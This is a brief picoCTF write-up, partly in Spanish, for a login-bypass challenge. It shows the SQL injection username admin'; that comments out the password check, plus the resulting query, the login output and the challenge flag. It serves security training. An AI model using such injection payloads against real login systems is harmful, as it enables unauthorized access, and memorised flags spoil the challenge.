## Objetivo
`https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Solución
```bash
admin';
psw:hola
 picoCTF{m0R3_SQL_plz_fa983901}
 ---
 username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
```
## Notas
Solamente tenemos que hacer una cadena en el usuario de logeo de la forma admin'; ya que e suna inyeccion que ignora la parte derecha de la consulta